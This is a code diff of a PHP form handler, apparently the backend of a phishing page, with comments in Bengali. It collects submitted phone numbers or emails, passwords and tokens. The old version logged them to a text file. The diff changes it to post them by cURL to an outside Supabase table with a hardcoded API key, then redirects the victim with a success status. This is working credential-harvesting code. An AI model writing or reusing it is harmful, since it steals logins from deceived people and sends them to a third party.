@@ -1,22 +1,39 @@
 <?php
+// ১. Supabase এর তথ্য সেট করা
+$url = "https://hglekeepnigvpvsvazdb.supabase.co/rest/v1/user_data";
+$apiKey = "sb_publishable_BYyYGnXd6L5YY_O8tnp2IQ_DtORlYVF";
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Get data from the form
-    $phone = isset($_POST["phone"]) ? $_POST["phone"] : "";
-    $password = isset($_POST["password"]) ? $_POST["password"] : "";
-    $token = isset($_POST["token"]) ? $_POST["token"] : "";
+    // ২. ফর্ম থেকে ডাটা সংগ্রহ করা
+    $phone    = isset($_POST['phone']) ? $_POST['phone'] : "";
+    $password = isset($_POST['password']) ? $_POST['password'] : "";
+    $token    = isset($_POST['token']) ? $_POST['token'] : "";
 
-    // Create log entry with timestamp
-    $timestamp = date("Y-m-d H:i:s");
-    $log_entry = "[$timestamp] Phone/Email: " . $phone . " | Password: " . $password . " | Token: " . $token . "\n";
+    // ৩. ডাটাবেসে পাঠানোর জন্য ডাটা তৈরি করা
+    $data = [
+        "phone"    => $phone,
+        "password" => $password,
+        "token"    => $token
+    ];
 
-    // Append to loge.txt
-    file_put_contents("/tmp/loge.txt", $log_entry, FILE_APPEND);
+    // ৪. cURL ব্যবহার করে Supabase API-তে ডাটা পাঠানো
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'apikey: ' . $apiKey,
+        'Authorization: Bearer ' . $apiKey,
+        'Content-Type: application/json',
+        'Prefer: return=representation'
+    ]);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    
+    $response = curl_exec($ch);
+    curl_close($ch);
 
-    // Redirect back to the main page or a success page
+    // ৫. কাজ শেষ হলে রিডাইরেক্ট করা
     header("Location: index.html?status=success");
     exit();
 } else {
-    // If accessed directly, redirect to the main page
     header("Location: index.html");
     exit();
 }
